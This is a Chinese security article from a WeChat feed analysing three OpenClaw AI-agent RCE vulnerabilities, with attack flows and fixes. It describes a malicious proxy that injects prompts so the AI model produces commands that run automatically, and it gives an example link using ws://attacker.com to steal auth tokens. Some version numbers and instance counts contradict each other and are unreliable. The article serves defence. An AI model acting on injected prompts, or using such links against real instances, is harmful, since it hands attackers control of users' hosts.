---
title: OpenClaw 三大高危 RCE 漏洞全解析
url: https://mp.weixin.qq.com/s/x7L4X13VnDuORGNcf3FP8g
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:55:33.426856
---

# OpenClaw 三大高危 RCE 漏洞全解析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquPJWTsicQqbMxNicJlGjToV4icCCIR2OHss35WpFiaRHF40bmh3U5AyALxCB1bseOByibbwefczoLdupmwhoAfQAdCNrcZibq9JlPdEI/0?wx_fmt=jpeg)

# OpenClaw 三大高危 RCE 漏洞全解析

梦鱼
梦鱼

船山信安

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

AI 代理平台在提升运维与自动化效率的同时，其安全风险正快速暴露。

近期，OpenClaw 连续被曝出三个可直接导致远程代码执行（RCE）的高危漏洞，分别为请求流注入、插件自动加载、跨站 WebSocket 劫持，均能在低门槛条件下实现主机完全接管。本文对 CVE-2026-30741、CVE-2026-32920、CVE-2026-25253 进行全覆盖拆解，还原攻击链路，给出分析建议。

一、漏洞总览三个漏洞均覆盖请求输入、插件生态、前端会话全链路，无需强认证、无需复杂交互即可利用，对生产环境威胁极大。CVE编号 漏洞类型 CVSS 影响版本 核心危害CVE-2026-30741 请求流注入导致RCE 9.8 v2026.2.6及更早 无认证远程代码执行CVE-2026-32920 工作区插件自动加载 9.2 v2026.3.1及更早 恶意插件无校验加载CVE-2026-25253 跨站WebSocket劫持 8.8 v2026.1.2及更早 钓鱼窃取凭证

二、CVE-2026-30741：请求流注入导致 RCE漏洞概述存在于 OpenClaw Agent Platform v2026.2.6 及更早版本，由请求侧提示注入引发输入校验失效导致。CVSS 评分 9.8，攻击者无需身份认证，可直接远程执行任意代码。漏洞原理OpenClaw 没有对上游 API 请求做完整性校验。攻击者可构造恶意请求投毒请求流，绕过安全限制并注入可执行代码逻辑，诱导 AI 模型生成未授权终端命令，通过 MCP 工具链自动执行。攻击流程1.攻击者部署恶意 API 中转服务，篡改用户请求流2.用户在 OpenClaw 配置该恶意代理地址3.恶意代理劫持请求，注入恶意提示词4.AI 模型被诱导生成恶意命令5.OpenClaw 接收命令，自动执行6.攻击者远程控制目标主机修复建议•升级至 v2026.3.11 及以上版本•对所有外部输入进行严格白名单校验•遵循最小权限原则运行服务

三、CVE-2026-32920：工作区插件自动加载导致命令执行漏洞概述存在于 OpenClaw Agent Platform v2026.3.11 及更早版本，CVSS 评分 9.2。OpenClaw 会自动从 .OpenClaw/extensions/ 目录加载插件，未进行任何信任验证，攻击者可构造恶意插件实现远程代码执行。漏洞原理平台启动时无条件扫描、加载当前工作目录下的第三方插件，信任边界被完全破坏。漏洞核心代码位于：com.openclaw.agent.core.plugin.WorkspacePluginLoader.autoLoadWorkspacePlugins()攻击流程1.攻击者发布携带恶意代码的插件，开启监听端口2.用户在 OpenClaw 插件工作区配置该插件3.用户调用服务或重启时，OpenClaw 自动加载插件4.恶意代码执行，攻击者 GetShell修复建议•升级至最新版 OpenClaw•避免加载外部不明来源的插件•对插件进行签名校验和来源验证

四、CVE-2026-25253：跨站 WebSocket 劫持导致 RCE漏洞概述存在于 OpenClaw Agent Platform v2026.1.28 及更早版本，CVSS 评分 8.8。该漏洞已在野外被积极利用，影响超过 24,478 个公开暴露实例，其中超过 30,000 个实例已被入侵。漏洞原理前端加载时未对 gatewayUrl 参数做有效校验，且会自动附加浏览器存储的 authToken 向指定地址建立 WebSocket 连接，同时后端缺失 Origin 头校验。攻击流程1.攻击者诱骗受害者访问恶意链接： http://localhost:18789/?gatewayUrl=ws://attacker.com/2.受害者浏览器自动向攻击者控制的 WebSocket 服务器发起连接，并附带认证令牌3.攻击者获取令牌后，直接连接受害者 OpenClaw 实例4.利用 API 实现任意命令执行修复建议•及时更新 OpenClaw 至最新版本•修改 gatewayUrl 需用户显式确认•后端严格校验 WebSocket Origin 头五、总结与思考本次三大漏洞共同指向一个核心问题：AI 能力与系统执行权限之间缺少安全隔离。一旦输入被控制、组件被篡改、会话被劫持，系统将直接暴露在 RCE 风险下。企业部署建议原则 具体措施先升级后上线 第一时间更新至安全版本，关闭已知漏洞面输入全量校验 所有外部请求、插件、参数必须白名单管控权限最小化 杜绝服务账户过高权限，降低漏洞利用影响会话强加固 关键连接需确认、后端严格校验身份

声明：本文仅供技术研究与安全加固参考，请勿用于非法用途。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

船山信安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过